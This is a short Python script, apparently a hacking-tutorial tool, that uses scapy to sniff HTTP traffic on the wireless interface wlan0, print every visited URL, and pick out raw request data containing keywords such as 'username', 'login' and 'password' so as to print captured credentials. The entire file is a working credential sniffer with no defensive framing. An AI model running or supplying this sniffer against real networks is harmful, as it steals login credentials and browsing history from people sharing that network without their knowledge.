import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_packet)

def get_url(packet):
   return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "next", "Next"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Visited Url >> >> :" + url )
        login_info=get_login(packet)
        if login_info:
            print("\n\n[+] Usernames And Passwords >> >> :\n\n" + login_info)


sniff("wlan0")
